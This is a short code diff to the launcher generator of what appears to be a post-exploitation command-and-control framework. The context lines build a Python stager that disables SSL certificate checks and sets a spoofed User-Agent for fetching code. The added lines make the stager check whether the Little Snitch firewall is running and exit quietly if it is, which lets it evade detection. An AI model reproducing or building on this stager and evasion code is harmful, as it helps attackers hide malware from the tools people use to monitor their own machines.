@@ -250,6 +250,13 @@ class Stagers:
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
         launcherBase += "import sys, urllib2;"
+        launcherBase += "import re, subprocess;"
+        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
+        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
+        launcherBase += "out = ps.stdout.read()\n"
+        launcherBase += "ps.stdout.close()\n"
+        launcherBase += "if re.search(\"Little Snitch\", out):\n"
+        launcherBase += "   sys.exit()\n"
         launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
         launcherBase += "UA='%s';" %(userAgent)
         launcherBase += "o.addheaders=[('User-Agent',UA)];"
